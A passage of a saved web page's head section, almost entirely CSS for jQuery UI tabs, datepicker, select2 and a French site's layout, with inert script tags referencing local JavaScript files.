                margin: 0px 0.2em 1px 0px;
                padding-left: 0px;
                padding-right: 0px;
                white-space: nowrap;
                float: left;
                top: 1px;
                padding-top: 0px;
            }
            .ui-tabs .ui-tabs-nav LI A {
                padding-bottom: 0.5em;
                padding-left: 1em;
                padding-right: 1em;
                float: left;
                text-decoration: none;
                padding-top: 0.5em;
            }
            .ui-tabs .ui-tabs-nav LI.ui-tabs-selected {
                padding-bottom: 1px;
                margin-bottom: 0px;
            }
            .ui-tabs .ui-tabs-nav LI.ui-tabs-selected A {
                cursor: text;
            }
            .ui-tabs .ui-tabs-nav LI.ui-state-disabled A {
                cursor: text;
            }
            .ui-tabs .ui-tabs-nav LI.ui-state-processing A {
                cursor: text;
            }
            .ui-tabs .ui-tabs-nav LI A {
                cursor: pointer;
            }
            .ui-tabs-collapsible .ui-tabs-nav LI.ui-tabs-selected A {
                cursor: pointer;
            }
            .ui-tabs .ui-tabs-panel {
                padding-bottom: 1em;
                border-right-width: 0px;
                padding-left: 1.4em;
                padding-right: 1.4em;
                display: block;
                background: none transparent scroll repeat 0% 0%;
                border-top-width: 0px;
                border-bottom-width: 0px;
                border-left-width: 0px;
                padding-top: 1em;
            }
            .ui-tabs .ui-tabs-hide {
                display: none !important;
            }
            .ui-datepicker {
                padding-bottom: 0px;
                padding-left: 0.2em;
                width: 17em;
                padding-right: 0.2em;
                display: none;
                padding-top: 0.2em;
            }
            .ui-datepicker .ui-datepicker-header {
                position: relative;
                padding-bottom: 0.2em;
                padding-left: 0px;
                padding-right: 0px;
                padding-top: 0.2em;
            }
            .ui-datepicker .ui-datepicker-prev {
                position: absolute;
                width: 1.8em;
                height: 1.8em;
                top: 2px;
            }
            .ui-datepicker .ui-datepicker-next {
                position: absolute;
                width: 1.8em;
                height: 1.8em;
                top: 2px;
            }
            .ui-datepicker .ui-datepicker-prev-hover {
                top: 1px;
            }
            .ui-datepicker .ui-datepicker-next-hover {
                top: 1px;
            }
            .ui-datepicker .ui-datepicker-prev {
                left: 2px;
            }
            .ui-datepicker .ui-datepicker-next {
                right: 2px;
            }
            .ui-datepicker .ui-datepicker-prev-hover {
                left: 1px;
            }
            .ui-datepicker .ui-datepicker-next-hover {
                right: 1px;
            }
            .ui-datepicker .ui-datepicker-prev SPAN {
                position: absolute;
                margin-top: -8px;
                display: block;
                margin-left: -8px;
                top: 50%;
                left: 50%;
            }
            .ui-datepicker .ui-datepicker-next SPAN {
                position: absolute;
                margin-top: -8px;
                display: block;
                margin-left: -8px;
                top: 50%;
                left: 50%;
            }
            .ui-datepicker .ui-datepicker-title {
                text-align: center;
                line-height: 1.8em;
                margin: 0px 2.3em;
            }
            .ui-datepicker .ui-datepicker-title SELECT {
                margin: 1px 0px;
                font-size: 1em;
            }
            .ui-datepicker SELECT.ui-datepicker-month-year {
                width: 100%;
            }
            .ui-datepicker SELECT.ui-datepicker-month {
                width: 49%;
            }
            .ui-datepicker SELECT.ui-datepicker-year {
                width: 49%;
            }
            .ui-datepicker TABLE {
                margin: 0px 0px 0.4em;
                width: 100%;
                border-collapse: collapse;
                font-size: 0.9em;
            }
            .ui-datepicker TH {
                border-bottom: 0px;
                text-align: center;
                border-left: 0px;
                padding-bottom: 0.7em;
                padding-left: 0.3em;
                padding-right: 0.3em;
                border-top: 0px;
                font-weight: bold;
                border-right: 0px;
                padding-top: 0.7em;
            }
            .ui-datepicker TD {
                border-bottom: 0px;
                border-left: 0px;
                padding-bottom: 1px;
                padding-left: 1px;
                padding-right: 1px;
                border-top: 0px;
                border-right: 0px;
                padding-top: 1px;
            }
            .ui-datepicker TD SPAN {
                text-align: right;
                padding-bottom: 0.2em;
                padding-left: 0.2em;
                padding-right: 0.2em;
                display: block;
                text-decoration: none;
                padding-top: 0.2em;
            }
            .ui-datepicker TD A {
                text-align: right;
                padding-bottom: 0.2em;
                padding-left: 0.2em;
                padding-right: 0.2em;
                display: block;
                text-decoration: none;
                padding-top: 0.2em;
            }
            .ui-datepicker .ui-datepicker-buttonpane {
                background-image: none;
                border-bottom: 0px;
                border-left: 0px;
                padding-bottom: 0px;
                margin: 0.7em 0px 0px;
                padding-left: 0.2em;
                padding-right: 0.2em;
                border-right: 0px;
                padding-top: 0px;
            }
            .ui-datepicker .ui-datepicker-buttonpane BUTTON {
                padding-bottom: 0.3em;
                margin: 0.5em 0.2em 0.4em;
                padding-left: 0.6em;
                width: auto;
                padding-right: 0.6em;
                float: right;
                overflow: visible;
                cursor: pointer;
                padding-top: 0.2em;
            }
            .ui-datepicker .ui-datepicker-buttonpane BUTTON.ui-datepicker-current {
                float: left;
            }
            .ui-datepicker-multi {
                width: auto;
            }
            .ui-datepicker-multi .ui-datepicker-group {
                float: left;
            }
            .ui-datepicker-multi .ui-datepicker-group TABLE {
                margin: 0px auto 0.4em;
                width: 95%;
            }
            .ui-datepicker-multi-2 .ui-datepicker-group {
                width: 50%;
            }
            .ui-datepicker-multi-3 .ui-datepicker-group {
                width: 33.3%;
            }
            .ui-datepicker-multi-4 .ui-datepicker-group {
                width: 25%;
            }
            .ui-datepicker-multi .ui-datepicker-group-last .ui-datepicker-header {
                border-left-width: 0px;
            }
            .ui-datepicker-multi .ui-datepicker-group-middle .ui-datepicker-header {
                border-left-width: 0px;
            }
            .ui-datepicker-multi .ui-datepicker-buttonpane {
                clear: left;
            }
            .ui-datepicker-row-break {
                width: 100%;
                clear: both;
                font-size: 0em;
            }
            .ui-datepicker-rtl {
                direction: rtl;
            }
            .ui-datepicker-rtl .ui-datepicker-prev {
                right: 2px;
                left: auto;
            }
            .ui-datepicker-rtl .ui-datepicker-next {
                right: auto;
                left: 2px;
            }
            .ui-datepicker-rtl .ui-datepicker-prev:hover {
                right: 1px;
                left: auto;
            }
            .ui-datepicker-rtl .ui-datepicker-next:hover {
                right: auto;
                left: 1px;
            }
            .ui-datepicker-rtl .ui-datepicker-buttonpane {
                clear: right;
            }
            .ui-datepicker-rtl .ui-datepicker-buttonpane BUTTON {
                float: left;
            }
            .ui-datepicker-rtl .ui-datepicker-buttonpane BUTTON.ui-datepicker-current {
                float: right;
            }
            .ui-datepicker-rtl .ui-datepicker-group {
                float: right;
            }
            .ui-datepicker-rtl .ui-datepicker-group-last .ui-datepicker-header {
                border-right-width: 0px;
                border-left-width: 1px;
            }
            .ui-datepicker-rtl .ui-datepicker-group-middle .ui-datepicker-header {
                border-right-width: 0px;
                border-left-width: 1px;
            }
            .ui-datepicker-cover {
                z-index: -1;
                position: absolute;
                filter: mask();
                width: 200px;
                display: block;
                height: 200px;
                top: -4px;
                left: -4px;
            }
            .ui-progressbar {
                text-align: left;
                height: 2em;
                overflow: hidden;
            }
            .ui-progressbar .ui-progressbar-value {
                margin: -1px;
                height: 100%;
            }
        </style>
        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/mask.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/vform.js"></script>
        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.inputmask.js"></script>
        <script language="javascript" data-savepage-type="text/javascript" type="text/plain"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/entete.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/javascript.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/imprimepdf.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/table2CSV.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.printElement.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/date-fr-FR.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/mask.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.inputmask.extentions.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.inputmask.date.extentions.js"></script>

        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" data-savepage-src="../../javascript/jquery.inputmask.numeric.extentions.js"></script>
        <style data-savepage-href="../../styles/select2.css">
            .select2-container {
                position: relative;
                zoom: 1;
                display: inline;
            }
            .select2-container {
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                -khtml-box-sizing: border-box;
            }
            .select2-drop {
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                -khtml-box-sizing: border-box;
            }
            .select2-search {
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                -khtml-box-sizing: border-box;
            }
            .select2-container .select2-search INPUT {
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                -khtml-box-sizing: border-box;
            }
            .select2-container .select2-choice {
                border-bottom: #aaa 1px solid;
                position: relative;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#eeeeee', endColorstr = '#ffffff', GradientType = 0);
                border-left: #aaa 1px solid;
                padding-bottom: 0px;
                line-height: 26px;
                background-color: #fff;
                padding-left: 8px;
                padding-right: 0px;
                display: block;
                white-space: nowrap;
                height: 26px;
                color: #444;
                overflow: hidden;
                border-top: #aaa 1px solid;
                border-right: #aaa 1px solid;
                text-decoration: none;
                padding-top: 0px;
                -moz-border-radius: 4px;
                -webkit-border-radius: 4px;
                border-radius: 4px;
                -moz-background-clip: padding;
                -webkit-background-clip: padding-box;
                background-clip: padding-box;
            }
            .select2-container .select2-choice SPAN {
                text-overflow: ellipsis;
                display: block;
                white-space: nowrap;
                overflow: hidden;
                margin-right: 26px;
                -o-text-overflow: ellipsis;
            }
            .select2-container .select2-choice ABBR {
                border-bottom: 0px;
                position: absolute;
                border-left: 0px;
                outline-style: none;
                outline-color: invert;
                outline-width: 0px;
                width: 12px;
                display: block;
                background: /*savepage-url=select2.png*/ url() no-repeat right top;
                height: 12px;
                font-size: 1px;
                border-top: 0px;
                top: 8px;
                cursor: pointer;
                right: 26px;
                border-right: 0px;
                text-decoration: none;
            }
            .select2-container .select2-choice ABBR:hover {
                background-position: right -11px;
                cursor: pointer;
            }
            .select2-container .select2-drop {
                z-index: 999;
                border-bottom: #aaa 1px solid;
                position: absolute;
                border-left: #aaa 1px solid;
                margin-top: -1px;
                width: 100%;
                background: #fff;
                border-top: 0px;
                top: 100%;
                border-right: #aaa 1px solid;
                -moz-border-radius: 0 0 4px 4px;
                -webkit-border-radius: 0 0 4px 4px;
                border-radius: 0 0 4px 4px;
                -webkit-box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15);
                -moz-box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15);
                -o-box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15);
                box-shadow: 0 4px 5px rgba(0, 0, 0, 0.15);
            }
            .select2-container .select2-choice DIV {
                position: absolute;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#cccccc', endColorstr = '#eeeeee', GradientType = 0);
                border-left: #aaa 1px solid;
                width: 18px;
                display: block;
                background: #ccc;
                height: 100%;
                top: 0px;
                right: 0px;
                -moz-border-radius: 0 4px 4px 0;
                -webkit-border-radius: 0 4px 4px 0;
                border-radius: 0 4px 4px 0;
                -moz-background-clip: padding;
                -webkit-background-clip: padding-box;
                background-clip: padding-box;
            }
            .select2-container .select2-choice DIV B {
                width: 100%;
                display: block;
                background: /*savepage-url=select2.png*/ url() no-repeat 0px 1px;
                height: 100%;
            }
            .select2-container .select2-search {
                z-index: 1010;
                margin: 0px;
                min-height: 26px;
                padding-left: 4px;
                width: 100%;
                padding-right: 4px;
                display: inline-block;
                white-space: nowrap;
            }
            .select2-container .select2-search-hidden {
                position: absolute;
                display: block;
                left: -10000px;
            }
            .select2-container .select2-search INPUT {
                border-bottom: #aaa 1px solid;
                border-left: #aaa 1px solid;
                padding-bottom: 4px;
                margin: 0px;
                outline-style: none;
                outline-color: invert;
                min-height: 26px;
                padding-left: 5px;
                outline-width: 0px;
                width: 100%;
                padding-right: 20px;
                font-family: sans-serif;
                background: /*savepage-url=select2.png*/ url() no-repeat 100% 50%;
                height: auto !important;
                font-size: 1em;
                border-top: #aaa 1px solid;
                border-right: #aaa 1px solid;
                padding-top: 4px;
                -moz-border-radius: 0;
                -webkit-border-radius: 0;
                border-radius: 0;
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                box-shadow: none;
            }
            .select2-container .select2-search INPUT.select2-active {
                background: /*savepage-url=spinner.gif*/ url() no-repeat;
            }
            .select2-container-active .select2-choice {
                border-bottom: #5897fb 1px solid;
                border-left: #5897fb 1px solid;
                outline-style: none;
                outline-color: invert;
                outline-width: medium;
                border-top: #5897fb 1px solid;
                border-right: #5897fb 1px solid;
                -webkit-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -moz-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -o-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
            }
            .select2-container-active .select2-choices {
                border-bottom: #5897fb 1px solid;
                border-left: #5897fb 1px solid;
                outline-style: none;
                outline-color: invert;
                outline-width: medium;
                border-top: #5897fb 1px solid;
                border-right: #5897fb 1px solid;
                -webkit-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -moz-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -o-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
            }
            .select2-dropdown-open .select2-choice {
                border-bottom: transparent 1px solid;
                filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#eeeeee',GradientType=0 );
                border-left: #aaa 1px solid;
                background-color: #eee;
                border-top: #aaa 1px solid;
                border-right: #aaa 1px solid;
                -moz-border-radius-bottomleft: 0;
                -webkit-border-bottom-left-radius: 0;
                border-bottom-left-radius: 0;
                -moz-border-radius-bottomright: 0;
                -webkit-border-bottom-right-radius: 0;
                border-bottom-right-radius: 0;
                -webkit-box-shadow: 0 1px 0 #fff inset;
                -moz-box-shadow: 0 1px 0 #fff inset;
                -o-box-shadow: 0 1px 0 #fff inset;
                box-shadow: 0 1px 0 #fff inset;
            }
            .select2-dropdown-open .select2-choice DIV {
                border-left: medium none;
                background: none transparent scroll repeat 0% 0%;
            }
            .select2-dropdown-open .select2-choice DIV B {
                background-position: -18px 1px;
            }
            .select2-container .select2-results {
                position: relative;
                padding-bottom: 0px;
                overflow-x: hidden;
                overflow-y: auto;
                margin: 4px 4px 4px 0px;
                padding-left: 4px;
                padding-right: 0px;
                max-height: 200px;
                padding-top: 0px;
            }
            .select2-container .select2-results LI {
                padding-bottom: 8px;
                line-height: 80%;
                list-style-type: none;
                margin: 0px;
                padding-left: 7px;
                padding-right: 7px;
                display: list-item;
                cursor: pointer;
                padding-top: 7px;
            }
            .select2-container .select2-results .select2-highlighted {
                background: #3875d7;
                color: #fff;
            }
            .select2-container .select2-results LI EM {
                font-style: normal;
                background: #feffde;
            }
            .select2-container .select2-results .select2-highlighted EM {
                background: none transparent scroll repeat 0% 0%;
            }
            .select2-container .select2-results .select2-no-results {
                display: list-item;
                background: #f4f4f4;
            }
            .select2-container .select2-results .select2-disabled {
                display: none;
            }
            .select2-active {
                background: /*savepage-url=spinner.gif*/ url() #f4f4f4 no-repeat 100% 50%;
            }
            .select2-more-results {
                display: list-item;
                background: #f4f4f4;
            }
            .select2-container-disabled .select2-choice {
                background-image: none;
                border-bottom: #ddd 1px solid;
                border-left: #ddd 1px solid;
                background-color: #f4f4f4;
                border-top: #ddd 1px solid;
                cursor: default;
                border-right: #ddd 1px solid;
            }
            .select2-container-disabled .select2-choice DIV {
                background-image: none;
                border-left: 0px;
                background-color: #f4f4f4;
            }
            .select2-container-multi .select2-choices {
                border-bottom: #aaa 1px solid;
                position: relative;
                border-left: #aaa 1px solid;
                padding-bottom: 0px;
                background-color: #fff;
                margin: 0px;
                padding-left: 0px;
                padding-right: 0px;
                height: 1%;
                overflow: hidden;
                border-top: #aaa 1px solid;
                cursor: text;
                border-right: #aaa 1px solid;
                padding-top: 0px;
            }
            .select2-container-multi .select2-drop {
                margin-top: 0px;
            }
            .select2-container-multi .select2-choices {
                min-height: 26px;
            }
            .select2-container-active .select2-choices {
                border-bottom: #5897fb 1px solid;
                border-left: #5897fb 1px solid;
                outline-style: none;
                outline-color: invert;
                outline-width: medium;
                border-top: #5897fb 1px solid;
                border-right: #5897fb 1px solid;
                -webkit-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -moz-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                -o-box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
                box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
            }
            .select2-container-multi .select2-choices LI {
                list-style-type: none;
                float: left;
            }
            .select2-container-multi .select2-choices .select2-search-field {
                padding-bottom: 0px;
                margin: 0px;
                padding-left: 0px;
                padding-right: 0px;
                white-space: nowrap;
                padding-top: 0px;
            }
            .select2-container-multi .select2-choices .select2-search-field INPUT {
                border-bottom: 0px;
                border-left: 0px;
                padding-bottom: 5px;
                margin: 1px 0px;
                outline-style: none;
                outline-color: invert;
                padding-left: 5px;
                outline-width: 0px;
                padding-right: 5px;
                font-family: sans-serif;
                background: none transparent scroll repeat 0% 0%;
                height: 15px;
                color: #666;
                font-size: 100%;
                border-top: 0px;
                border-right: 0px;
                padding-top: 5px;
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                -o-box-shadow: none;
                box-shadow: none;
            }
            .select2-default {
                color: #999 !important;
            }
            .select2-container-multi .select2-choices .select2-search-choice {
                border-bottom: #aaaaaa 1px solid;
                position: relative;
                filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f4f4f4', endColorstr='#eeeeee', GradientType=0 );
                border-left: #aaaaaa 1px solid;
                padding-bottom: 3px;
                line-height: 13px;
                background-color: #e4e4e4;
                margin: 3px 0px 3px 5px;
                padding-left: 18px;
                padding-right: 5px;
                color: #333;
                border-top: #aaaaaa 1px solid;
                cursor: default;
                border-right: #aaaaaa 1px solid;
                padding-top: 3px;
                -moz-border-radius: 3px;
                -webkit-border-radius: 3px;
                border-radius: 3px;
                -moz-background-clip: padding;
                -webkit-background-clip: padding-box;
                background-clip: padding-box;
                -webkit-box-shadow: 0 0 2px #ffffff inset, 0 1px 0 rgba(0, 0, 0, 0.05);
                -moz-box-shadow: 0 0 2px #ffffff inset, 0 1px 0 rgba(0, 0, 0, 0.05);
                box-shadow: 0 0 2px #ffffff inset, 0 1px 0 rgba(0, 0, 0, 0.05);
            }
            .select2-container-multi .select2-choices .select2-search-choice SPAN {
                cursor: default;
            }
            .select2-container-multi .select2-choices .select2-search-choice-focus {
                background: #d4d4d4;
            }
            .select2-search-choice-close {
                position: absolute;
                outline-style: none;
                outline-color: invert;
                outline-width: medium;
                width: 12px;
                display: block;
                background: /*savepage-url=select2.png*/ url() no-repeat right top;
                height: 13px;
                font-size: 1px;
                top: 4px;
                right: 3px;
            }
            .select2-container-multi .select2-search-choice-close {
                left: 3px;
            }
            .select2-container-multi .select2-choices .select2-search-choice .select2-search-choice-close:hover {
                background-position: right -11px;
            }
            .select2-container-multi .select2-choices .select2-search-choice-focus .select2-search-choice-close {
                background-position: right -11px;
            }
            .select2-container-multi .select2-results {
                padding-bottom: 0px;
                margin: -1px 0px 0px;
                padding-left: 0px;
                padding-right: 0px;
                padding-top: 0px;
            }
            .select2-container-disabled .select2-choices {
                background-image: none;
                border-bottom: #ddd 1px solid;
                border-left: #ddd 1px solid;
                background-color: #f4f4f4;
                border-top: #ddd 1px solid;
                cursor: default;
                border-right: #ddd 1px solid;
            }
            .select2-container-disabled .select2-choices .select2-search-choice {
                background-image: none;
                border-bottom: #ddd 1px solid;
                border-left: #ddd 1px solid;
                padding-bottom: 3px;
                background-color: #f4f4f4;
                padding-left: 5px;
                padding-right: 5px;
                border-top: #ddd 1px solid;
                border-right: #ddd 1px solid;
                padding-top: 3px;
            }
            .select2-container-disabled .select2-choices .select2-search-choice .select2-search-choice-close {
                display: none;
            }
        </style>
        <script data-savepage-type="" type="text/plain" data-savepage-src="../../javascript/select2.js"></script>

        <script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../fic_utilitaires/S027_E001/S027_E001_cosmos_js/menu_haut_0001.js"></script>

        <script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../fic_utilitaires/S027_E001/S027_E001_cosmos_js/menu_gauche_0001.js"></script>

        <script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../fic_utilitaires/S027_E001/S027_E001_cosmos_js/menu_pied_0001.js"></script>

        <script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../fic_utilitaires/S027_E001/S027_E001_cosmos_js/noframe_0001.js"></script>

        <script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../javascript/entete.js"></script>
        <style data-savepage-href="../../styles/style.css" type="text/css">
            /* Positionnement general  */
            body {
              margin: 0;
              text-align: center;
              height:100%;
              font: normal 1em Arial, sans-serif;
              color: #586868;
              text-decoration: none;
              background: /*savepage-url=/tra_cosmos_img/fond.jpg*/ var(--savepage-url-8);
              background-position:top;
              background-repeat:repeat-y;
              font-size: 14px;
            }
            form {
              margin: 0px;
              padding: 0px;
            }
            table {
              margin: 0px;
              padding: 0px;
            }
            tr, td {
              font-size: 10px;
            }
            p {
              margin: 0px;
              padding: 0px;
              font-size: 11px;
              font-weight:normal;
              font: Arial, sans-serif;
            }
            p.intro{
              margin: 4px;
              padding: 4px;
              font-size: 11px;
              font-weight:bold;
              font: Arial, sans-serif;
            	color: #0091de;
            }
            div#conteneur {
              margin-left: auto;
              margin-right: auto;
              width: 957px;
              text-align: left;
              height:auto;
              background:#FFFFFF;
            }
            /* Fin Positionnement g鮩ral */

            /* Style G鮩ral */
            a {
                font-weight:bold;
                text-decoration: none;
                color: #7CBB00;
            }
            a:HOVER{
              text-decoration: underline;
            }
            img {
                border:0;
            }
            img a{
                border:0;
            }
            .bleu {
              color: #0091de;
            }
            .vert {
              color: #7cbb00;
            }
            a.bleu {
                font-weight:bold;
                text-decoration: none;
                color: #0091de;
            }
            .trad {
            	display: inline;
            }
            .tradsmall {
            	display: inline;
            	font-size: 9px;
            }
            hr {
              color: #0091de;
            }
            /* tr.clair {
              background-color: #ffffff !important;
            } */
            tr.fonce {
              background-color: #e8e8e9 !important;
            }
            #cache {
            	position:absolute;
            	left:360px;
            	top:0px;
            	z-index:10000;
            }
            /* Fin Style G鮩ral */

            /* Bloc En-t괥 haut */
            div.En-tete {
                right:0px;
                top:0px;
                width:957px;
                height:23px;
                font-size: 10px;
            }
            div.header1-sepvert {
                float:right;
                height:23px;
                width: 5px;
                margin-top: 5px;
                background: /*savepage-url=/tra_cosmos_img/separation_verte.jpg*/ url() no-repeat;
            }
            div.header1-sepbleu {
                float:right;
                height:23px;
                width: 5px;
                margin-top: 5px;
                background: /*savepage-url=/tra_cosmos_img/separation_bleue.jpg*/ var(--savepage-url-9) no-repeat;
            }
            div.header1-01_ a, div.header1-02_ a, div.header1-03_ a, div.header1-04_ a, div.header1-05_ a, div.header1-06_ {
            	font-size: 10px !important;
                float:right;
                top:0px;
                height:23px;
                text-transform: uppercase;
                padding: 3px 10px 0px 5px;
                font-weight: bolder;
            }
            div.header1-01_ a, div.header1-02_ a {
                color: #0091de !important;
            }
            div.header1-03_ a , div.header1-04_ a, div.header1-05_ a{
                color: #0091de !important;
            /* modif 2012_07_09 BV suite ࠤemande M. Berthet    color: #7cbb00 !important; */
            }
            .header1-05_ select {
              color: #586868;
              font-size: 10px !important;
              width: 110px;
              font-weight: normal;
              float:right;
              margin:2px 10px 0px 0px;
              height:17px;
              text-transform: uppercase;
            }

            /* Fin Bloc En-t괥 haut */

            /* Bloc En-t괥 logo */
            div.Bando_logo {
                left:0px;
                top:0px;
                width: 931px;
                height: 59px;
                margin-left:13px;
                margin-right:13px;
                font-size: 12px;
                font-weight: bolder;
            }
            div.header2-seplogo {
                float:left;
                height:51px;
                width: 15px;
                background: /*savepage-url=/tra_cosmos_img/separation_logo_noire.jpg*/ url() no-repeat;
            }
            div.header2-02_ {
                float:left;
                top:0px;
                height:51px;
                padding: 14px 0px 5px 0px;
            }
            div.header2-03_ {
                float:left;
                top:0px;
                height:51px;
                padding: 0px 12px 0px 5px;
            }
            /* Fin Bloc En-t괥 logo */

            /* Bloc Home */
            div.decoupe-home-02_ {
                left:0px;
                top:240px;
                width:943px;
                height:240px;
            }
            div.contenu_home {
                left:13px;
                top:0px;
                width:943px;
                height:620px;
                margin-left:13px;
            }
            div.decoupe-home-03_ {
                float:left;
                height:360px;
                padding-left: 13px;
            	width:340px;
                border: 3px solid #f3f3f3;
                background-color: #dfebf7;
            }
            div.decoupe-home-04_ {
                float:left;
                height:360px;
                width: 558px;
                margin-left: 7px;
                border: 3px solid #f3f3f3;
            }
            div.decoupe-home-05_ {
                width: 950px;
                padding-left: 10px;
            }
            div.decoupe-home-05_ table {
            	text-align: center;
            	margin-left:auto;
            	margin-right:auto;
            }
            /* Fin bloc Home */

            /* Bloc Contenu */
            div.contenu {
                position:relative;
                left:0px;
                top:0px;
                width:957px;
            }
            div.contenu-01_ {
                float:left;
                left:0px;
                top:0px;
            }
            div.contenu-02_ {
                float:left;
                width: 825px;
                padding: 0px 5px 5px 5px;
            }
            div.contenu-long-02_ {
            /* permet de positionner le pied de page en base du texte lorsque celui-ci d鰡sse une page d'affichage */
                float:left;
                width:825px;
                padding:0;
            }
            #contenu-02_texte {
                font: 0.8em Arial, sans-serif;
                text-align:justify;
                width: 815px;
                color:#586868;
                padding:0px 0px 20px 20px;
            }
            div.contenu-02_texte li {
                margin-left:20px;
                list-style:/*savepage-url=/tra_cosmos_img/puce_vert_0015.gif*/url();
            }
            div.contenu-02_texte li#violet {
                margin-left:20px;
                list-style:/*savepage-url=/tra_cosmos_img/puce_0015.gif*/url();
            }
            div.contenu-03_ {
                float:left;
                width:190px;
                background: /*savepage-url=/tra_cosmos_img/contenu_03.jpg*/ url() no-repeat 0 top;
            }
            div.contenu-03_texte {
                font: 0.8em Arial, sans-serif;
                float:left;
                top:0px;
                width:110px;
                padding:90px 0 0 29px;
            }
            /* Fin Bloc Contenu */

            /* Bloc Pied de page */
            div.footer_ {
                clear:both;
                /*width:957px;*/
                height:30px;
                font: bold 9px Arial, sans-serif;
                text-align:center;
                padding:0px 0px 20px 33px;
                position:relative;
                color:#707E87;
            }
            div.footer_ a{
                text-decoration:none;
                color:#707E87;
            }
            /* Fin Bloc Pied de page */

            /* Bloc localisation */
            .local_ {
                clear:both;
                padding: 10px 0px 0px 0px;
                height:10px;
                color:#878787;
                font: bold 9px Arial, sans-serif;
            }
            .local_ a {
                color:#878787;
                text-decoration:none;
            }
            .local_ a:hover {
                text-decoration:underline;
            }
            /* Fin Bloc localisation */

            /* Bloc Print */
            span.print {
                color:#707E87;
            }
            span.print A:link {
                color:#707E87;
            }
            /* Fin Bloc Print */

            /* css ancienne g鮩ration */
            .p20l {
              font-size: 17px;
              font-weight: bold;
              padding-top: 10px;
              color: #7cbb00;
            }
            .ll, td.ll, td.ll_minus {
                font-style: italic;
                font-size: 11px;
            }
            td.ll {
                text-transform: uppercase;
                color: #586868;
            }
            .ll_noitalic {
                font-style: normal !important;
                font-size: 11px;
            }
            .ll_noitalic a, .ll_noitalic a:hover {
              color: #586868;
              font-weight: normal;
              text-decoration: underline;
            }
            .lb_noitalic {
            	font-size: 11px;
            	font-style: normal! important;
            }
            .lb_noitalic A {
            	color: #586868;
            }
            .lb_noitalic A:hover {
            	color: #586868;
            	text-decoration: underline;
            }
            .lc_noitalic {
            	text-align: center;
            	font-size: 11px;
            	font-style: normal! important;
            }
            .lc {
            	text-align: center;
            	font-size: 11px;
            	font-style: italic;
            }
            .lc_small {
            	text-align: center;
            	font-size: 9px;
            	font-style: italic:
            }
            .tln {
              text-transform: uppercase;
              text-align: right !important;
              font-size: 11px;
              color: #586868;
            }
            .pl, td.pl {
              text-transform: uppercase;
              text-align: left !important;
              font-size: 11px;
            }
            .pl {
              color: #7cbb00;
            }
            td.pl {
              color: #586868 !important;
            }
            input {
              border: solid #586868 1px;
              font-size: 11px;
              width: 210px;
              height: 18px !important;
              color: #586868;
            }
            input.ll_inputfile {
              font-style: normal !important;
            	width: 400px;
            	height: 24px !important;
            	background-color: #ffffff;
            }
            input.ll, input.lr, input.ll_select {
              font-style: normal !important;
            }
            input.ll_date {
              font-style: normal !important;
              width: 70px;
            }
            input.ll_check {
              border: 0px;
              width: 15px;
            }
            input.ll_verysmall {
              width: 34px;
            }
            input.ll_small, input.lr_small, input.fond_cr_small {
              width: 70px;
            }
            input.ll_ident {
              width: 120px;
            }
            input.ll_medium {
              width: 230px;
            }
            input.ll_long {
              width: 730px;
            }
            input.fond_cl, input.fond_cr, input.fond_cc, input.fond_cr_small {
              border: solid #e8e8e9 0px;
              background-color: #e8e8e9;
              font-size: 10px;
              width: 210px;
              height: 18px !important;
